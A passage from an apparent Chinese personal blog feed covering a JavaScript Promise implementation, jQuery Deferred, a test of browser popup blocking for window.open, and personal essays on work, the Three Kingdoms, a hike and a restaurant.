class="keyword">this</span>._doPromise(value.then);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 执行完了之后标记为完成</span></span><br><span class="line">        <span class="keyword">this</span>.status = <span class="string">&quot;fulfilled&quot;</span>;</span><br><span class="line">        <span class="keyword">this</span>.value = value;</span><br><span class="line">        <span class="keyword">this</span>._dequeue();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        <span class="keyword">this</span>.reject(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line">reject: function(reason) &#123;</span><br><span class="line">    <span class="comment">// 标记状态为出错</span></span><br><span class="line">    <span class="keyword">this</span>.status = <span class="string">&quot;rejected&quot;</span>;</span><br><span class="line">    <span class="keyword">this</span>.value = reason;</span><br><span class="line">    <span class="keyword">this</span>._dequeue();</span><br><span class="line">&#125;,</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，每次 resolve 的时候都会用一个 try..catch 包裹来捕获未知错误。</p><figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line">_dequeue: function()&#123;</span><br><span class="line">    var <span class="keyword">handler</span>;</span><br><span class="line">    <span class="comment">// 执行事务，直到队列为空</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">this</span>.handlers.length) &#123;</span><br><span class="line">        <span class="keyword">handler</span> = <span class="keyword">this</span>.handlers.shift();</span><br><span class="line">        <span class="keyword">this</span>._handle(<span class="keyword">handler</span>.thenPromise, <span class="keyword">handler</span>.onFulfilled, <span class="keyword">handler</span>.onRejected);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>无论是 resolve 还是 reject 都会让程序往后奔流，直到结束所有事务，所以这两个方法中都有 _dequeue 函数。</p><figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line">_handle: <span class="function"><span class="keyword">function</span><span class="params">(thenPromise, onFulfilled, onRejected)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">self</span> = this;</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 判断下次操作采用哪个函数，reject 还是 resolve</span></span><br><span class="line">        <span class="keyword">var</span> callback = <span class="keyword">self</span>.status == <span class="string">&quot;fulfilled&quot;</span></span><br><span class="line">                       ? onFulfilled</span><br><span class="line">                       : onRejected;</span><br><span class="line">        <span class="comment">// 只有是函数才会继续回调</span></span><br><span class="line">        <span class="keyword">if</span> (typeof callback === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">self</span>.resolve.call(thenPromise, callback(<span class="keyword">self</span>.value));</span><br><span class="line">            &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">                <span class="keyword">self</span>.reject.call(thenPromise, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 否则就将 value 传递给下一个事务了</span></span><br><span class="line">        <span class="keyword">self</span>.status == <span class="string">&quot;fulfilled&quot;</span></span><br><span class="line">                        ? <span class="keyword">self</span>.resolve.call(thenPromise, <span class="keyword">self</span>.value)</span><br><span class="line">                        : <span class="keyword">self</span>.reject.call(thenPromise, <span class="keyword">self</span>.value);</span><br><span class="line">    &#125;, <span class="number">1</span>);</span><br><span class="line">&#125;,</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个函数跟上一节提到的 _fire 类似，如果 callback 是 function，就会进入子事务队列，处理完了之后退回到主事务队列。最后一个 then 方法，将事务推进队列。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">then</span>: <span class="keyword">function</span>(<span class="params">onFulfilled, onRejected</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> thenPromise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">status</span> == <span class="string">&quot;pending&quot;</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">handlers</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">            <span class="attr">thenPromise</span>: thenPromise,</span><br><span class="line">            <span class="attr">onFulfilled</span>: onFulfilled,</span><br><span class="line">            <span class="attr">onRejected</span>: onRejected</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">_handle</span>(thenPromise, onFulfilled, onRejected);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> thenPromise;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果第二节没有理解清楚，这一节也会让人头疼，这一部分讲的比较粗糙。</p><h3 id="_5"><a class="headeranchor-link" name="user-content-_5" href="#_5"></a>第三章 异步编程</h3><h4 id="jquery-defferred"><a class="headeranchor-link" name="user-content-jquery-defferred" href="#jquery-defferred"></a>一、jQuery 中的 Defferred 对象</h4><p>或许你在面试的时候，有面试官问你：</p><blockquote><p><code>$.ajax()</code> 执行后返回的结果是什么？</p></blockquote><p>在 jQuery1.5 版本就已经引入了 Defferred 对象，当时为了引入这个东西，整个 jQuery 都被重构了。Defferred 跟 Promise 类似，它表示一个还未完成任务的对象，而 Promise 确切的说，是一个代表未知值的对象。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    <span class="attr">url</span>: url</span><br><span class="line">&#125;).done(<span class="keyword">function</span>(<span class="params">data, status, xhr</span>)&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;).fail(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>回忆下第二章第一节中的 Promise，是不是如出一辙，只是 jQuery 还提供了更多的语法糖：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: url,</span><br><span class="line">    <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">error</span>: <span class="title function_">funtion</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>他允许将 done 和 fail 两个函数的回调放在 ajax 初始化的参数 success 和 fail 上，其原理还是一样的，同样，还有这样的东西：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">$.<span class="built_in">when</span>(taskOne, taskTwo).done(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;都执行完毕后才会输出我！&quot;</span>);</span><br><span class="line">&#125;).fail(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;只要有一个失败，就会输出我！&quot;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>当 taskOne 和 taskTwo 都完成之后才执行 done 回调，这个浏览器内置的 Promise 也有对应的函数：</span></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="title function_">all</span>([<span class="literal">true</span>, <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">1</span>), ...]).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">value</span>)&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>浏览器内置的 Promise 还提供了一个 API：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="title function_">race</span>([<span class="literal">true</span>, <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">1</span>), ...]).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">value</span>)&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;, <span class="keyword">function</span>(<span class="params">reason</span>)&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>只要 race 参数中有一个 resolve 或者 reject，then 回调就会出发。</p><h4 id="_6"><a class="headeranchor-link" name="user-content-_6" href="#_6"></a>二、基于事件响应的异步模型</h4><p><a href="http://weibo.com/shyvo">@朴灵</a> 写的 <a href="//github.com/JacksonTian/eventproxy">EventProxy</a> 就是基于事件响应的异步模型，按理说，这个实现的逻辑是最清晰的，不过代码量稍微多一点。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">taskA</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="string">&quot;A&quot;</span>;</span><br><span class="line">        E.<span class="title function_">emit</span>(<span class="string">&quot;taskA&quot;</span>, result);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">taskB</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">        E.<span class="title function_">emit</span>(<span class="string">&quot;taskB&quot;</span>, result);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">E.<span class="title function_">all</span>([<span class="string">&quot;taskA&quot;</span>, <span class="string">&quot;taskB&quot;</span>], <span class="keyword">function</span>(<span class="params">A, B</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> A + B;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我没有看他的源码，但是想想，应该是这个逻辑。只需要在消息中心管理各个 emit 以及消息注册。这里的错误处理值得思考下。</p><p>在半年前，也写过一篇关于异步编程的文章：<a href="http://www.cnblogs.com/hustskyking/p/javascript-asynchronous-programming.html">JavaScript异步编程原理</a>，感兴趣的可以去读一读。</p><h3 id="_7"><a class="headeranchor-link" name="user-content-_7" href="#_7"></a>第四章 小结</h3><h4 id="_8"><a class="headeranchor-link" name="user-content-_8" href="#_8"></a>一、小结</h4><p>文章比较长，阅读了好几天别人写的东西，自己提笔还是比较轻松的，本文大概花费了 6 个小时撰写。</p><p>本文主要解说了 Promise 的应用场景和实现原理，如果你能够顺畅的读完全文并且之处文中的一些错误，说明你已经悟到了：）</p><p>Promise 使用起来不难，但是理解其原理还是有点偏头痛的，所以下面列举的几篇相关阅读也建议读者点进去看看。</p><h4 id="_9"><a class="headeranchor-link" name="user-content-_9" href="#_9"></a>二、相关阅读</h4><ul><li><a href="http://www.html5rocks.com/zh/tutorials/es6/promises/">JavaScript Promises</a></li><li><a href="http://mweb.baidu.com/p/promise-introduction.html">Promise 初探</a></li><li><a href="http://mweb.baidu.com/p/javascript-async-0.html">JavaScript中的异步梳理（0）</a></li><li><a href="http://mweb.baidu.com/p/javascript-async-2-promises-a.html">JavaScript中的异步梳理（2）&mdash;&mdash;使用Promises/A</a></li><li><a href="http://www.web-tinker.com/article/20154.html">jQuery的Deferred对象</a></li><li><a href="http://blog.qivhou.com/translation/2013/08/20/promise-deferred-objects-in-javascript-pt2-practical-use/">JavaScript中的Promise和Deferred对象 第二部分：实战</a></li><li><a href="//developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise">MDN</a></li><li><a href="http://www.cnblogs.com/hustskyking/p/javascript-asynchronous-programming.html">JavaScript异步编程原理</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 异步 </tag>
            
            <tag> Promise </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工作半年多了</title>
      <link href="/blog/2014/09/29/%E5%B7%A5%E4%BD%9C%E5%8D%8A%E5%B9%B4%E5%A4%9A%E4%BA%86/"/>
      <url>/blog/2014/09/29/%E5%B7%A5%E4%BD%9C%E5%8D%8A%E5%B9%B4%E5%A4%9A%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<p>加上实习，已经在外头工作半年多了。</p><p>大四上学期在北京飘荡了三个月，认识了不少朋友，离开北京之后，交往少了，感情也淡了<br>。好像一直都是这样，从小学到大学再到大学毕业，相知相识的人很多很多，可是一旦分离<br>，时间就会冲淡一切。</p><p>现在在杭州，阿里巴巴工作。过的还是有些平淡了。</p><p>一直没有停止技术上追求卓越的脚步，现在也算是打下了扎实的基础。而大学四年的记忆却因自己懒于回忆而渐渐淡去，或许是时候停下脚步，整理整理凌乱的思绪，想想前路应该怎么走。</p><p>很多同学临近毕业之时，甚至在毕业之后依然处于懵懂茫然的状态，不知道自己追求的是什么，更不知道自己在这个社会扮演什么样的角色。</p><p>我的建议是：提高自己，勿忘初心。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么我们的技术“落后”于国外？</title>
      <link href="/blog/2014/09/28/why-we-behind-the-world/"/>
      <url>/blog/2014/09/28/why-we-behind-the-world/</url>
      
        <content type="html"><![CDATA[<p>淘宝将 XTemplate 从 KISSY 中分离出来，作为单独的模板工具以迎合阿里巴巴各种 前端&#x2F;node端 需求，今天在群里看到一个老外介绍 XTemplate 的<a href="http://dailyjs.com/2014/09/24/node-roundup/">文章链接</a>，顿生感慨。</p><p>英语是世界语，中国人懂英文是比较正常的事情，但是很少会有国人使用英文撰写博客，这就直接锐减了我们的信息出口，从而减少了老外主动跟我们交流的机会。</p><p>技术的进步不仅需要有一堆人埋头苦干，更重要的环节是将埋头苦干的研究成果分享出来，老外们的分享，我们很容易获取到，不仅仅是我们，全世界都能获取并且方便理解，可是中文内容的分享不以为然，所以今天在老外的博客中看到国人的研究成果，让我感慨万千。</p><p>国内的技术氛围相当浓烈，经常能在圈子里看到优秀的文章产出，很多文章也是同步于最新技术的，从这个角度来看，国内的技术并没有落后国外，或者说并没有落后多少。上次也看到裕波邀请国外的技术大牛来华演讲，这足以说明国内技术向外扩展的渴望和趋势。</p><p>现在我们应该静下心来思考，如何让国外的技术圈子更加了解中国的技术发展，如何创建一个与国外程序员交流的平台！</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闲扯三国</title>
      <link href="/blog/2014/09/23/%E9%97%B2%E6%89%AF%E4%B8%89%E5%9B%BD/"/>
      <url>/blog/2014/09/23/%E9%97%B2%E6%89%AF%E4%B8%89%E5%9B%BD/</url>
      
        <content type="html"><![CDATA[<p>孙坚之后有孙策，孙策之后有孙权，周瑜辅佐孙权，周公瑾死后有鲁子敬，子敬病毙，又有吕蒙，阿蒙挂了还有陆逊，四位军事家相继辅佐孙权，他也算有福气。还有一个三世元老，子布老头，为江东大管家，为孙仲谋管钱、管粮、管兵器，真可谓碉之堡也！</p><p>再看看曹操和刘备，曹操那边，荀彧（文若）死后倒是出了个司马懿，不过仲达老先生领着儿子把曹丕给做了。玄德就更惨了，死后阿斗活啃诸葛孔明←_←</p><p><img src="/../blogimgs/2014/09/23/%E5%AD%99%E6%9D%83+%E8%AF%B8%E8%91%9B%E4%BA%AE.jpg" alt="孙权+诸葛亮"><!--<source src="http://barret.qiniudn.com/%E5%AD%99%E6%9D%83%2B%E8%AF%B8%E8%91%9B%E4%BA%AE.jpg">--></p><center>孙权跟诸葛亮站一起，感觉有点怪怪的~</center><p>话锋转回来，为何江东多才俊？（本来标题是『为何江东多才俊』，写到一半给改了）我们先来看看孙字辈的一家人，孙权从小就足智多谋，跟着父亲和哥哥，学了不少本事，胆量也杠杆的！再看看周瑜，周公瑾是一个雄才，韬略伟岸，志存高远，还是自学的。但是后边几位…难道 TM 都是自学的么，真是不可思议！</p><p>江东多才俊，为何多才俊还取不了天下？说到底还是儿子不争气，孙权的儿子一个个地争王位，窝里反，争就争吧，还没一个叼的，都是草包，草包旁边也都没个军师，所以家事处不好就别想着争天下了。</p><p>曹操的几个儿子里头，曹冲很聪明，但显露才华太耀眼，最后被兄弟干死，曹彰是个愣头青，目标就是做将军，杀尽强敌，曹植是个醉鬼，每日跟着宾客吟诗歌赋，雅兴勃勃，自在不已。唯独曹丕，世人眼里平淡无奇，实则牛逼烘烘，暗藏韬晦，这也是仲达选择辅佐他的原因。</p><p><a href="http://barretlee.com/life/2014/09/16/review-cao/">上次</a>已经表达了我对曹操的敬畏之情，不再赘述。这里要说说刘备。以仁义为本，曾被曹操追着打时，带着二十万百姓逃命，若不是江夏有个小弟照应，早挂了。每取一州郡，便抚民安民，施之以仁义，按理这是很高明的做法，但也致使了若师出无“正义军”名便不能随便夺人家城池，搞的诸葛亮取西川的时候纠结的蛋疼，最后还是凤雏庞统舍身而得正义之名。</p><p><img src="/../blogimgs/2014/09/23/%E6%A1%83%E5%9B%AD%E7%BB%93%E4%B9%89.jpg" alt="桃园结义"><!--<source src="http://barret.qiniudn.com/%E6%A1%83%E5%9B%AD%E7%BB%93%E4%B9%89.jpg">--></p><center>来来来，干了这杯，还有下杯~</center><p>刘备的两个兄弟，一个是莽夫，一个视天下如蝼蚁，傲视群雄，大意失荆州，真搞不懂怎么还那么多人供奉他（黑社会供着还可以理解，竟还有人供他为财神）。兄弟之情让刘备的军营像个山寨，刘备是个山大王，关羽和张飞只怕哥哥刘备，其他人都当成狗屎，故多次违抗军令，最后被人剁头也是情理之中。</p><p>好了，今天就扯到这里，欲知后文，请待下回分解！</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> 三国演义 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>徽杭古道游记</title>
      <link href="/blog/2014/09/21/%E5%BE%BD%E6%9D%AD%E5%8F%A4%E9%81%93%E6%B8%B8%E8%AE%B0/"/>
      <url>/blog/2014/09/21/%E5%BE%BD%E6%9D%AD%E5%8F%A4%E9%81%93%E6%B8%B8%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>平日里抱久了电脑，内网偶现旅行的帖子，赶紧地报了个名。</p><p>徽杭古道，西起安徽伏岭镇，东至浙江马啸乡，延绵二十多公里，算是个国家 4A 级的的旅游景点。</p><p>早上五点多起来，到公司之后随着 150 人的庞大队伍向古道行进。领队是我们 Team 的龙俊哥哥，这让我有了不少安全感。大清早，在等待其他同事到来之前，大巴师傅开着车去了趟加油站，很清楚的看到，1000 元的柴油，于是扒开地图一看，单程 200 多公里，路途颇为遥远。</p><p><img src="/../blogimgs/2014/09/21/QQ20140921-1@2x.png" alt="地图"><!--<source src="http://barret.qiniudn.com/QQ20140921-1%402x.png">--></p><p>我比较喜欢爬山，虽然没走两步就气喘吁吁了。第一次爬过的像样点的山是武当山，跟着几个大学同学一起过去，爬到半山腰时，队伍已经远远的将我甩下，当时我进也不是，退也不是，因为无论进退都得两三个小时，只要掏出手机，咬咬牙，听着音乐一步一步的向前迈进。</p><p>遥遥几百公里，几乎都是穿山而过，不得不感叹社会的发展给我们的生活带来的便利，也不得不<strong>反思大自然因人类无止尽的追求而受到的破坏</strong>。在车上，领队也特意强调了环境保护的问题，他让我们每人都带着一个垃圾收纳袋，将旅行过程产生的垃圾都带回来，毕竟<strong>城市对垃圾的处理能力要强于自然区</strong>。</p><p>途中经过了《倩女幽魂》的拍摄地，隔着车窗拍了一张。</p><p><img src="/../blogimgs/2014/09/21/IMG_20140920_093958.jpg" alt="倩女幽魂"><!--<source src="http://barret.qiniudn.com/IMG_20140920_093958.jpg">--></p><p>两块巨石相隔，可惜车跑的太快，加上路道树木过多，没有拍到要点。古道给人整体的感觉就是，山和水溶为一体，处处都有流水声，走进古道之前，就有所体会。</p><p><img src="/../blogimgs/2014/09/21/IMG_20140920_100756.jpg" alt="流水人家"><!--<source src="http://barret.qiniudn.com/IMG_20140920_100756.jpg">--></p><p>防止拉伤，我们驻足在古道入口，放下书包和登山杖，跟着领队做热身运动。</p><p><img src="/../blogimgs/2014/09/21/IMG_20140920_101518.jpg" alt="古道入口"><!--<source src="http://barret.qiniudn.com/IMG_20140920_101518.jpg">--></p><p>不过热身运动的照片我没有拍:)。刚走进去还是一路平川</p><p><img src="/../blogimgs/2014/09/21/IMG_20140920_104549.jpg" alt="行在平地"><!--<source src="http://barret.qiniudn.com/IMG_20140920_104549.jpg">--></p><p>前十分钟还未看到阶梯，所以也能悠悠的拍上几张，风景着实不错，主要是空气清新，吸不到城市的 pm2.5 。</p><p><img src="/../blogimgs/2014/09/21/IMG_20140920_113042.jpg" alt="山川"><!--<source src="http://barret.qiniudn.com/IMG_20140920_113042.jpg">--></p><p>昨天下了场小雨，我们还担心今日没法出行，得上天眷顾，施舍了我们一天的太阳，十多分钟之后，渐渐的踏入了窄道。</p><p><img src="/../blogimgs/2014/09/21/IMG_20140920_123330.jpg" alt="队列"><!--<source src="http://barret.qiniudn.com/IMG_20140920_123330.jpg">--></p><p>山虽不高，梯度却是十分明显，所以我们可以看到比较湍急的流水。</p><p><img src="/../blogimgs/2014/09/21/IMG_20140920_140140.jpg" alt="流水"><!--<source src="http://barret.qiniudn.com/IMG_20140920_140140.jpg">--></p><p>水很清，也有点凉，凉水洒在脸上，感觉自然的气息很美妙。下面是我和室友的一张合影，（打个广告，室友单身，靠谱，年轻有为）</p><p><img src="/../blogimgs/2014/09/21/IMG_20140920_142853.jpg" alt="合影"><!--<source src="http://barret.qiniudn.com/IMG_20140920_142853.jpg">--></p><p>在狭路上向下俯视，瞬间来了一阵尿意，胆小的女生双腿也会微微颤栗，确实很高。</p><p><img src="/../blogimgs/2014/09/21/IMG_20140920_144158.jpg" alt="俯视"><!--<source src="http://barret.qiniudn.com/IMG_20140920_144158.jpg">--></p><p>走在前面，回头看看大家，姑娘也是挺多的。</p><p><img src="/../blogimgs/2014/09/21/IMG_20140920_144258.jpg" alt="回头"><!--<source src="http://barret.qiniudn.com/IMG_20140920_144258.jpg">--></p><p>自从发了福之后，豪气就没有当年那么明显了。</p><p><img src="/../blogimgs/2014/09/21/IMG_20140920_144511.jpg" alt="自己"><!--<source src="http://barret.qiniudn.com/IMG_20140920_144511.jpg">--></p><p>20km 走罢，人已经从杭州走进了安徽，到了另一个入口——江南第一关。</p><p><img src="/../blogimgs/2014/09/21/IMG_20140920_152010.jpg" alt="安徽入口"><!--<source src="http://barret.qiniudn.com/IMG_20140920_152010.jpg">--></p><p>最后看一眼徽派建筑，就得拖着疲惫的身躯回家了。</p><p><img src="/../blogimgs/2014/09/21/IMG_20140920_162925.jpg" alt="徽派建筑"><!--<source src="http://barret.qiniudn.com/IMG_20140920_162925.jpg">--></p><p>徽杭古道，其高度，对于我来说，恰到好处，不至于太累，但是也够呛。实在是太久太久没有走出门了，选个适合自己的徒步景区，放松下心情，也是极好的。</p><p>一路下来，有两点东西，让我感触颇深。一个是环境，一个是对自然的敬畏。</p><p>其实两者都是自然对人的反作用力。徽杭古道沿途的垃圾还是有点多了，领队跟我们说，『自然拥有分解有机物的能力，但是如果每个过来旅游的人都扔一个香蕉皮，丢一片垃圾，自然的分解能力是否赶得上人类对它的伤害？』这个问题不用思考我们就知道答案，但是出行的人是否真的将这个答案放在心底呢？</p><p>第二点，对自然的敬畏。领队说，『尽量不要做出任何反自然的行为』，如踢开脚下的石头，折断挡路的树枝，踩死脚下的虫蚁等等，这些都属于反自然的行为，野外行走，放松是一方面，学会保护自己更是需要关注的另一方面，做不了的事情不要太逞能，在野外受伤（或者挂了）的人很多都属于逞能型的；也不要跟自然作对，一切都做都应该是轻缓的，最小伤害的。</p><p>这些也是本次出行最大的收获！</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
          <category> 在路上 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游记 </tag>
            
            <tag> 徽杭古道 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>千岛湖土菜馆</title>
      <link href="/blog/2014/09/17/%E5%8D%83%E5%B2%9B%E6%B9%96%E5%9C%9F%E8%8F%9C%E9%A6%86/"/>
      <url>/blog/2014/09/17/%E5%8D%83%E5%B2%9B%E6%B9%96%E5%9C%9F%E8%8F%9C%E9%A6%86/</url>
      
        <content type="html"><![CDATA[<p>曾在北京实习了三个月，百度的伙食，两个字形容，“难吃”！</p><p>也可能是常在公司吃饭，吃腻了。那时，也是经常拉着同事到附近的餐馆凑一桌，氛围挺好，可每次等菜的时间却又太长，所以在吃饭这点，一直特别不满意。</p><p>都说杭州是个地美人美的地方，最近有点不敢苟同了。我住在余杭区，前些年这里繁荣程度一般。或许是因为阿里巴巴搬到了西溪，亦或许是因为城里住的人太多房子不够了，高楼在四处缓缓升起。</p><p>这些天，<strong>无数卡车、水泥车在路上猖狂流窜，扬尘漫天，已经颇受不了这环境了！</strong>今天去“千岛湖土菜馆”的路上就深有此感！</p><p>下过几次土菜馆，这一家的口味相当赞，物美价廉，老板还比较体贴。骑着三辆小电驴，沿着下面的路线，朝目的地奔去。</p><p><img src="http://barretlee.com/life/content/images/2014/Sep/1.JPG"></p><p>五个人，点了七个菜</p><ul><li>尖椒肉丝（辣）</li><li>酱爆螺丝</li><li>葱油鳊鱼</li><li>蒜泥空心菜</li><li>韭菜炒蛋</li><li>干锅土豆</li></ul><p>还有个啥，记不起来了，本来是110元，使用淘点点下来，少付了20元。</p><p>尖椒确实有点辣，不过还是一扫而空，螺丝是那种比较小的，尾部用钳子钳开，只需前头一嗦，鲜肉立马出来，所以在我们那边也管着叫“嗦螺”。葱油鳊鱼，这道菜挺不错，只是鳊鱼腹部有些类似肥膘的肉，不够好吃，这鱼是先用蒸笼蒸熟，然后热油淋过，撒上葱花，加些酱油制成，回头自己定要尝试一番！</p><p>干锅土豆，火料放的有点多，吃到一半，烧干了，我们的大厨龙俊师傅，果断撩起茶壶，注水约100ml，味道倍儿棒！韭菜炒蛋就没的说了，好像是第二个上的，我还没怎么上筷子，已经没有了，**<em>饥民伤不起啊~</em>**</p><p>我只是想表达，阿里的食堂和周边比百度好很多，仅此而已。</p><p>-EOF-</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
            <tag> 吃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>window.open被浏览器拦截</title>
      <link href="/blog/2014/09/07/onclick-in-javascript/"/>
      <url>/blog/2014/09/07/onclick-in-javascript/</url>
      
        <content type="html"><![CDATA[<p>我们都知道浏览器会拦截非鼠标触发的 window.open 事件，不同浏览器的处理不统一，如 chrome 还支持键盘触发 open，而 firefox 只允许鼠标左键触发，etc.</p><p>在低版本 IE 下，我们可以使用 ActiveXObject 或者 Object 新开一个页面，如：</p><pre><code>// IE Onlyvar o=new ActiveXObject(&quot;WMPlayer.OCX&quot;);o.launchURL(&quot;http://barretlee.com&quot;);</code></pre><p>如果用户禁用了 WMP 对象，自然也是弹不出来的，值得注意的是，此处打开页面的是系统默认浏览器，而不是正在执行该脚本的浏览器，因为 WMP 使用的是自己的方法开打页面，跟浏览器没有任何关系。</p><p>我也尝试在页面中插入一个空的 iframe ，然后在 iframe 中打开链接，不通。<br>也尝试过模拟事件来触发 click，依然不行。</p><p>open 页面，浏览器会跟踪事件源，如果不是外部设备输入的而是 javascript 执行的信号，此次 open 将被浏览器拦截（浏览器设置了允许某个 URL 弹窗除外）。</p><p>根据这个问题，我也测试了下，浏览器的反应时间：</p><pre><code>// 点击页面后，出现弹窗document.onclick = function()&#123;  setTimeout(function()&#123;    open(&quot;http://barretlee.com&quot;)  &#125;, 1000);&#125;// 点击页面后，出现未弹窗document.onclick = function()&#123;  setTimeout(function()&#123;    open(&quot;http://barretlee.com&quot;)  &#125;, 1001);&#125;</code></pre><p>根据上面的测试，可以知道浏览器对外部设备信号的感知允许 1s 的延迟，为了排除进程阻塞的干扰，加了个 while 循环 1s：</p><pre><code>document.onclick = function()&#123;  var t = new Date*1;   while(new Date*1 - t &lt; 1000)&#123;&#125;   setTimeout(function()&#123;    open(&quot;http://barretlee.com&quot;)  &#125;, 1000)&#125;</code></pre><p>上面代码并没有弹窗。</p><p>由此可以确定用户操作，浏览器允许的响应时间就是 1s 了。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> 浏览器拦截 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PC远程调试移动设备</title>
      <link href="/blog/2014/08/29/cb-remote-debug-in-mobile-development/"/>
      <url>/blog/2014/08/29/cb-remote-debug-in-mobile-development/</url>
      
